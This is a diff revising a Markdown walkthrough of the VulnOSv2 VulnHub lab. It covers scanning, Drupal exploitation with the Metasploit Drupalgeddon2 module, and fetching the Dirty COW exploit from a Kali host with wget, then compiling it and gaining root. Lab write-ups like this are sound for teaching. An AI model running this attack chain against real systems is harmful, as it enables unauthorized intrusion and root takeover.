@@ -1,6 +1,3 @@
-Here’s a cleaner full-step walkthrough format you can directly paste into your `vulnosv2-writeup.md` file 🥺💻
-(based on the VulnOSv2 machine and walkthrough references) ([Medium][1])
-
 ````md
 # VulnOSv2 Writeup
 
@@ -26,6 +23,8 @@ Here’s a cleaner full-step walkthrough format you can directly paste into your
 
 # Step 1 — Discover Target IP
 
+Run netdiscover:
+
 ```bash
 sudo netdiscover -r 192.168.X.0/24
 ````
@@ -39,6 +38,8 @@ Target Found:
 ---
 
 # Step 2 — Nmap Enumeration
+
+Run Nmap scan:
 
 ```bash
 sudo nmap -sC -sV -A TARGET_IP
@@ -56,7 +57,7 @@ sudo nmap -sC -sV -A TARGET_IP
 
 # Step 3 — Browse Website
 
-Open:
+Open target website:
 
 ```txt
 http://TARGET_IP
@@ -80,6 +81,8 @@ http://TARGET_IP/jabc
 
 ## Nikto Scan
 
+Run Nikto:
+
 ```bash
 nikto -h http://TARGET_IP/jabc
 ```
@@ -89,8 +92,6 @@ Interesting findings:
 * Drupal CMS detected
 * robots.txt present
 * install.php found
-
----
 
 ## Gobuster Enumeration
 
@@ -110,11 +111,15 @@ droopescan scan drupal -u http://TARGET_IP/jabc
 
 Detected:
 
-* Drupal 7.x
+```txt
+Drupal 7.x
+```
 
 ---
 
 # Step 6 — Search for Exploits
+
+Search exploit:
 
 ```bash
 searchsploit drupal 7
@@ -142,7 +147,7 @@ Search exploit:
 search drupalgeddon2
 ```
 
-Use module:
+Use exploit:
 
 ```bash
 use exploit/unix/webapp/drupal_drupalgeddon2
@@ -162,17 +167,19 @@ Run exploit:
 run
 ```
 
-Meterpreter session obtained.
+Meterpreter session obtained successfully.
 
 ---
 
 # Step 8 — Get Interactive Shell
 
+Spawn shell:
+
 ```bash
 shell
 ```
 
-Check user:
+Check current user:
 
 ```bash
 whoami
@@ -184,7 +191,7 @@ Check kernel version:
 uname -a
 ```
 
-Older Ubuntu kernel vulnerable to Dirty COW discovered.
+Older Ubuntu kernel vulnerable to Dirty COW identified.
 
 ---
 
@@ -196,22 +203,22 @@ Search exploit:
 searchsploit Ubuntu 14.04 3
 ```
 
-Copy exploit:
+Copy exploit locally:
 
 ```bash
 searchsploit -m linux/local/40839.c
 ```
 
-Start Python server on Kali:
+Start Python server on Kali Linux:
 
 ```bash
 python3 -m http.server 8000
 ```
 
-On target machine:
+On target machine download exploit:
 
 ```bash
-wget http://YOUR_KALI_IP/40839.c
+wget http://YOUR_KALI_IP:8000/40839.c
 ```
 
 Compile exploit:
@@ -232,7 +239,7 @@ Run exploit:
 ./exploit
 ```
 
-New privileged user created.
+New privileged user created successfully.
 
 Switch user:
 
@@ -255,31 +262,54 @@ id
 Output:
 
 ```bash
-uid=0(root) gid=0(root).
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+Root access successfully achieved.
 
 ---
 
-#Step 11 — Capture the Flag
+# Step 11 — Capture the Flag
 
-After gaining root access, enumerated the root directory contents.
+After gaining root access, enumerate current directory.
 
 List files:
 
+```bash
 ls
+```
 
 Output:
 
+```bash
 flag.txt
+```
 
 Read the flag:
 
+```bash
 cat flag.txt
+```
 
 Output:
 
+```txt
 Congratulations! You have successfully rooted VulnOSv2.
 ```
-Root access successfully achieved.
+
+Verify current user:
+
+```bash
+whoami
+```
+
+Output:
+
+```bash
+root
+```
+
+Machine fully compromised successfully.
 
 ---
 
@@ -291,15 +321,13 @@ Root access successfully achieved.
 ssh user@TARGET_IP
 ```
 
----
-
 ## Webmin Enumeration
 
 ```txt
 https://TARGET_IP:10000
 ```
 
-Enumerated Webmin service and configuration.
+Enumerated Webmin service and configurations.
 
 ---
 
@@ -338,3 +366,6 @@ This lab was completed in a legal offline environment for educational and ethica
 
 Sabareesh
 Cybersecurity Learner | Ethical Hacking | VulnHub Labs
+
+```
+```
